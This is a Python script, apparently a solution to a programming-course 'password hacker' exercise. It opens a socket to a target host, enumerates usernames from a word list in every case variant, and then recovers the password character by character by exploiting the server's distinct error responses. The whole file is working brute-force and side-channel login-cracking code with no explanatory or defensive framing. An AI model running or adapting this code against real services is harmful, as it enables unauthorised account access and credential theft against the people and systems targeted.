import argparse
import socket
import itertools
import json
import string


class Hacker:
    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('ip_address')
        parser.add_argument('port', type=int)
        args = parser.parse_args()
        self.my_socket = socket.socket()
        self.my_socket.connect((args.ip_address, args.port))
        self.start()

    def start(self):
        login_dict = self.find_login('logins.txt')
        chars = string.ascii_letters + string.digits
        while True:
            for char in chars:
                login_dict['password'] = login_dict['password'][:-1] + char
                json_dict = json.dumps(login_dict)
                self.my_socket.send(json_dict.encode())
                response = json.loads(self.my_socket.recv(1024).decode())
                if response['result'] == 'Connection success!':
                    print(json_dict)
                    self.my_socket.close()
                    exit()
                if response['result'] == 'Exception happened during login':
                    login_dict['password'] += 'a'
                    break

    def find_login(self, filename):
        login_dict = {"login": '', "password": ''}
        with open(filename, 'r') as file:
            for word in file:
                for attempt in self.case_versions(word.strip()):
                    login_dict['login'] = attempt
                    json_dict = json.dumps(login_dict)
                    self.my_socket.send(json_dict.encode())
                    response = json.loads(self.my_socket.recv(1024).decode())
                    if response['result'] == "Wrong password!":
                        file.close()
                        return login_dict

    @staticmethod
    def case_versions(word):
        cases = [char.lower() + char.upper() for char in word]
        for password in itertools.product(*cases):
            password = ''.join(str(x) for x in password)
            yield password


if __name__ == '__main__':
    Hacker()
